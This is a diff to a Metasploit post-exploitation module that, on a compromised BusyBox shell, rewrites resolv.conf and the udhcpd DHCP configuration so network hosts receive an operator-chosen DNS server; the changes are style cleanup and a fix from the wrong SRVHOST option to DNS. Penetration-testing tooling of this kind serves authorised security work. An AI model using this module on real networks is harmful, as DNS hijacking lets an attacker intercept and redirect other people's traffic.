@@ -9,26 +9,27 @@ class MetasploitModule < Msf::Post
 
   def initialize
     super(
-      'Name'         => 'BusyBox DNS Configuration',
-      'Description'  => %q{
+      'Name' => 'BusyBox DNS Configuration',
+      'Description' => %q{
         This module will be applied on a session connected to a BusyBox shell. It allows
         to set the DNS server on the device executing BusyBox so it will be sent by the
         DHCP server to network hosts.
       },
-      'Author'       => 'Javier Vicente Vallejo',
-      'License'      => MSF_LICENSE,
-      'Platform'      => ['linux'],
-      'SessionTypes'  => ['shell']
+      'Author' => 'Javier Vicente Vallejo',
+      'License' => MSF_LICENSE,
+      'Platform' => ['linux'],
+      'SessionTypes' => ['shell']
     )
 
     register_options(
       [
-        OptAddress.new('DNS',   [ true, 'The dns server address' ])
-      ])
+        OptAddress.new('DNS', [ true, 'The dns server address' ])
+      ]
+    )
   end
 
   def run
-    print_status("Searching for files to modify dns server.")
+    print_status('Searching for files to modify dns server.')
     if busy_box_file_exist?('/etc/resolv.conf')
       modify_resolv_conf
     end
@@ -40,7 +41,7 @@ class MetasploitModule < Msf::Post
 
   def modify_resolv_conf
     print_status('File /etc/resolv.conf found')
-    if busy_box_write_file('/etc/resolv.conf', "nameserver #{datastore['SRVHOST']}", false)
+    if busy_box_write_file('/etc/resolv.conf', "nameserver #{datastore['DNS']}", false)
       print_good('DNS server added to resolv.conf')
     end
   end
@@ -48,7 +49,7 @@ class MetasploitModule < Msf::Post
   def modify_udhcpd_conf
     print_status('File /etc/udhcpd.conf found')
 
-    if busy_box_write_file('/etc/udhcpd.conf', "option dns #{datastore['SRVHOST']}", true)
+    if busy_box_write_file('/etc/udhcpd.conf', "option dns #{datastore['DNS']}", true)
       restart_dhcpd('/etc/udhcpd.conf')
     else
       print_status('Unable to write udhcpd.conf, searching a writable directory...')
@@ -56,9 +57,9 @@ class MetasploitModule < Msf::Post
       if writable_directory
         print_status("Copying the original udhcpd.conf to #{writable_directory}tmp.conf")
         cmd_exec("cp -f /etc/udhcpd.conf #{writable_directory}tmp.conf")
-        Rex::sleep(0.3)
+        Rex.sleep(0.3)
         print_status("Adding DNS to #{writable_directory}tmp.conf")
-        busy_box_write_file("#{writable_directory}tmp.conf", "option dns #{datastore['SRVHOST']}", true)
+        busy_box_write_file("#{writable_directory}tmp.conf", "option dns #{datastore['DNS']}", true)
         restart_dhcpd("#{writable_directory}tmp.conf")
       else
         print_error('Writable directory not found')
